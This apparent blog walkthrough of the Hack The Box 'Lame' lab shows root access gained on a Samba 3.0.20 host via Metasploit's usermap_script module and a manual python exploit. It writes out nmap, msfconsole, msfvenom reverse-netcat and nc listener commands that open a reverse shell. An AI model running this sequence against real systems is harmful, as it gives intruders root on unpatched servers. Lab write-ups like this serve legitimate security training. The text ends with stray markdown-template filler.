=============================================
## Scanning and Enumeration
=============================================
<p>&nbsp;</p>

We start with a basic nmap scan to see what ports are open:

    nmap -A -T4 10.10.10.3

![](/images/lame/2. nmap.png "nmap results")
![](/images/lame/3. nmap_2.png "nmap results")

So we have ftp, ssh, and smb open.  Normally it would be worth exploring ftp to see if we can access any files that may contain ssh creds since ssh is open as well.  From what we can tell so far, this appears to be some sort of Debian-based Linux machine.

In this case though we see a Unix Samba version - Samba 3.0.20, so let's try searching for that.

![](/images/lame/4. google_samba_exploit.png "Google: Samba 3.0.20-debian exploit")

So we have a rapid7 (metasploit) result as well as an exploitdb result.  Let's open both:

## Exploitation using Metasploit
=============================================
<p>&nbsp;</p>

https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script

The rapid7 website has the following instructions for using the metasploit module:

![](/images/lame/5. metasploit options.png "rapid7 website")

So let's try them.  Load up msfconsole and follow the steps:

    use exploit/multi/samba/usermap_script

    show options

![](/images/lame/6. msf_1.png "metasploit")

    set rhosts 10.10.10.3

    show targets

![](/images/lame/7. msf_2.png "metasploit")


We have set the remote host (rhosts, aka the target), and the only target available is Automatic. Let's try and run it.

    run

![](/images/lame/8. msf_3.png "metasploit")

[+] Success!  We are root.  

Notice this shell does not give a prompt after the initial connection.  After you see the “Command shell session 1 opened...”  you should have a shell and be able to enter commands.

Let's go get some flags.

    cat /home/makis/user.txt

    cat /root/root.txt

![](/images/lame/9. user_flag.png "user flag")

![](/images/lame/10. root_flag.png "root flag")

And there we have our user and root flags.

## Manual Exploitation
=============================================
<p>&nbsp;</p>

![](/images/lame/11. exploit_db.png "exploit-db entry")

In this case, the exploit-db entry is the Metasploit module.  Let's go back to Google and try to find something elsewhere:

![](/images/lame/12. google.png "google for the win")

Let's try this one. It contains a python script we should be able to modify to our needs.

![](/images/lame/13. github_exploit.png "exploit on github")

Click on the “Raw” and then copy/paste the code into your own python file. I'm calling mine “samba-exploit.py”

I'm using gedit, but feel free to use your text editor of choice. In your samba-exploit.py file, check out the following section:

![](/images/lame/14. edit_code.png "initial shellode")

Here we need to generate our own shellcode and then use it to replace all the "buf =" and "buf +=" lines.  Let's get to it:

    msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.24 LPORT=9997 -f python

Make sure you use your own IP address for the LHOST. 

This command may take a few moments to run and generate the shellcode.

![](/images/lame/15. msfvenom.png "msfvenom for shellcode")

Now copy/paste the generated shellcode into your samba-exploit.py:

![](/images/lame/16. edit_shellcode.png "editing the shellcode")

Notice I also replaced the comment above the shellcode with the actual msfvenom command I used. This is good practice if I ever need to refer back to this code.

Next, save the samba-exploit.py file and then chmod +x it to make it executable, then we can try and run it with no options:

    chmod +x samba-exploit.py

    ./samba-exploit.py

![](/images/lame/17. chmod.png "chmod the script")

Looks simple - just add the IP address of the target.  First though we need to set up our listener to catch the callback.  In a separate terminal window, run:

    nc -lvnp 9997   

Note: This port must match whatever port number your chose for LPORT= in your shellcode

![](/images/lame/18. nc_listen.png "listener setup")

Now in the first terminal window we can run the exploit!

    ./samba-exploit.py 10.10.10.3

![](/images/lame/19. samba_exploit.png "execute the exploit")

This will appear to hang, that is normal.  Over in your second terminal window with the nc listener you should see:

![](/images/lame/20. nc_connect.png "nc reverse shell connection")

Notice in the above I already ran the “whoami” command...and we are root!  Success!

Let's go get some flags:

![](/images/lame/21. flags.png "flags")

And there you have it, our user and root flags.

You can use *italics*, **bold**, `code font text`, and create [links](https://www.markdownguide.org/cheat-sheet/). Here's a footnote [^1]. Here's a horizontal rule:
